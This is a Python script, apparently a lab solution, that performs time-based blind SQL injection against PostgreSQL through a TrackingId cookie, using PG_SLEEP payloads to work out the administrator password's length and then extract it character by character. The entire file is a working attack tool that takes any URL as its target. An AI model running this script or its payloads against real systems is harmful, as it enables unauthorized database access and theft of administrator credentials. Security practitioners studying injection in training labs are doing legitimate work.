import requests
import string
import sys
import getopt
import urllib.parse
import threading
from halo import Halo


def get_password_length(url, trackingId, session):
  password_length = 0
  i = 0

  while True:
    payload = f"'; SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = {i}) THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
    payload = urllib.parse.quote_plus(payload)
    cookies = {"TrackingId": trackingId + payload, "session": session}
    response = requests.get(url, cookies=cookies)
    response_time = int(response.elapsed.total_seconds())

    if response_time < 5:
      i += 1
      password_length += 1
    else:
     return password_length


def get_password(password_length, url, trackingId, session):
  spinner = Halo(spinner="bouncingBar")
  characters = string.ascii_lowercase + string.digits
  password = ""

  for i in range(password_length):
    spinner.start(f"Getting password: \"{password}\"")

    for x in characters:
      payload = f"'; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, {i+1}, 1) = '{x}') THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
      payload = urllib.parse.quote_plus(payload)
      cookies = {"TrackingId": trackingId + payload, "session": session}
      response = requests.get(url, cookies=cookies)
      response_time = int(response.elapsed.total_seconds())

      if response_time >= 10:
        password += x
        break

  return password

def get_cookie(url):
  session = requests.Session()
  response = session.get(url)
  cookies = session.cookies.get_dict()
  values = list(cookies.values())
  trackingId = values[0]
  session = values[1]
  return trackingId, session 


def main(argv):
  help_message = "This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: python3 bsqli-4.py -u <url>"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message) 
    print("\x1b[?25h", end="") # Make cursor visible 
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
      trackingId, session = get_cookie(url)
    elif opt == "-h":
      print(help_message) 
      print("\x1b[?25h", end="") # Make cursor visible 
      sys.exit()

  # Create and start spinner animation
  spinner = Halo(text="Getting password length...", spinner="bouncingBar")
  spinner.start()
  # Get password length
  password_length = get_password_length(url, trackingId, session)
  # Finish spinner
  spinner.succeed(f"The password length is: \"{password_length}\"")

  # Create a spinner animation
  spinner = Halo()
  # Get valid password
  password = get_password(password_length, url, trackingId, session)
  # Finish spinner
  spinner.succeed(f"The password is: \"{password}\"")


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()